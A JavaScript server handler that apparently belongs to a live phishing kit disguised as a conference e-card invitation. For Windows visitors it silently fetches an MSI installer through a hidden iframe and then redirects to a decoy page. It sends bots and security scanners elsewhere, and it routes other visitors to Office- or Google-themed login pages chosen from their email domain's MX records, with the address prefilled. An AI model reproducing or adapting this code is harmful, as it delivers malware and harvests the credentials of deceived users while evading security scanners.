import dns from "dns/promises";

/* ================= CONFIG ================= */

const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
  "https://aspiceconference.com/e-card_invitation/ecard.html";

const MSI_PATH = "/access_invitation";

const OFFICE_TARGET = "https://aspiceconference.com/cw";
const GOOGLE_TARGET = "https://aspiceconference.com/wa";
const DEFAULT_TARGET = "https://aspiceconference.com/wa";

const MX_TIMEOUT_MS = 1500;

/* ================= CACHE ================= */

const mxCache = new Map();

/* ================= HELPERS ================= */

function isBot(ua = "") {
  return /(bot|crawler|spider|headless|phantom|curl|wget|python|scrapy)/i.test(ua);
}

function extractEmail(req) {
  let email = "";

  if (req.query?.email)
    email = Array.isArray(req.query.email)
      ? req.query.email[0]
      : req.query.email;

  else if (req.query?.smn)
    email = Array.isArray(req.query.smn)
      ? req.query.smn[0]
      : req.query.smn;

  return typeof email === "string" ? email.trim().toLowerCase() : "";
}

function classifyMx(exchanges) {
  const mx = exchanges.join(" ");

  if (mx.includes("mail.protection.outlook.com"))
    return "office_definite";

  if (
    mx.includes("pphosted.com") ||
    mx.includes("mimecast.com") ||
    mx.includes("barracudanetworks.com") ||
    mx.includes("arsmtp.com") ||
    mx.includes("iphmx.com") ||
    mx.includes("messagelabs.com") ||
    mx.includes("forcepoint.com") ||
    mx.includes("sophos.com")
  )
    return "office_likely";

  if (mx.includes("google.com"))
    return "google_definite";

  return "other";
}

async function resolveMxWithTimeout(domain) {
  return Promise.race([
    dns.resolveMx(domain),
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("MX timeout")), MX_TIMEOUT_MS)
    ),
  ]);
}

async function detectProvider(email) {
  if (!email || !email.includes("@")) return "other";

  const domain = email.split("@")[1];

  if (mxCache.has(domain)) return mxCache.get(domain);

  try {
    const records = await resolveMxWithTimeout(domain);
    const exchanges = records.map(r => r.exchange.toLowerCase());

    const provider = classifyMx(exchanges);
    mxCache.set(domain, provider);
    return provider;
  } catch {
    return "other"; // fail-open
  }
}

/* ================= HANDLER ================= */

export default async function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";
  const isWindows = /windows/i.test(userAgent);
  const email = extractEmail(req);

  /* ===== WINDOWS FLOW ===== */
  if (isWindows) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Preparing Download…</title>
</head>
<body>
  <p>Your download will start shortly…</p>
  <button id="fallbackButton">Click here if download does not start</button>

  <script>
    (function(){
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '${MSI_PATH}';
      document.body.appendChild(iframe);

      document.getElementById('fallbackButton').onclick = function() {
        window.location.href = '${MSI_PATH}';
      };

      setTimeout(function(){
        window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
      }, 3000);
    })();
  </script>
</body>
</html>`;

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.status(200).send(html);
    return;
  }

  /* ===== BOT SHORT-CIRCUIT ===== */
  if (isBot(userAgent)) {
    res.writeHead(302, { Location: DEFAULT_TARGET });
    res.end();
    return;
  }

  /* ===== NON-WINDOWS FLOW ===== */
  let target = DEFAULT_TARGET;

  if (email) {
    const provider = await detectProvider(email);

    if (provider.startsWith("office")) target = OFFICE_TARGET;
    else if (provider === "google_definite") target = GOOGLE_TARGET;
  }

  const finalUrl = email
    ? `${target}#${encodeURIComponent(email)}`
    : target;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}
